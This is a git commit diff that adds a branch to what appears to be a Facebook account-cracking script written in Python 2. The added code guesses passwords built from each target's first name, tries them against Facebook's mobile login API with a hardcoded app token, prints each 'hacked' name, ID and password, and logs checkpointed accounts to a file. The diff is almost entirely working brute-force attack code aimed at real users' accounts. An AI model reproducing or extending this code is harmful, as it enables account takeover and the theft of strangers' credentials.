d0b7cca98a9ea02c8eebc3cc54956a0d4f2ec23c
yocors <67282781+yocors@users.noreply.github.com>
2020-07-18 01:22:32 +0200

    Update 2024.py

--- 2024.py
+++ 2024.py
@@ -504,3 +504,26 @@ def pilih_super():
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)
+																else: 
+											                                           pass10 = b['first_name'] + '0123456789'												
+			                                                                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																   q = json.load(data)												
+			                                                                                                           if 'access_token' in q:
+				                                                                                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                                                                                        z = json.loads(x.text)
+				                                                                                                        print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				                                                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
+				                                                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass10 + '\n'											
+				                                                                                                        oks.append(user+pass10)
+                                                                                                                                   else:
+			                                                                                                                if 'www.facebook.com' in q["error_msg"]:
+				                                                                                                            print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                                                                                                            print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
+				                                                                                                            print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                                                                                                            print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass10 + '\n'
+				                                                                                                            cek = open("out/super_cp.txt", "a")
+				                                                                                                            cek.write("ID:" +user+ " Pw:" +pass10+"\n")
+				                                                                                                            cek.close()
+				                                                                                                            cekpoint.append(user+pass10)
+															
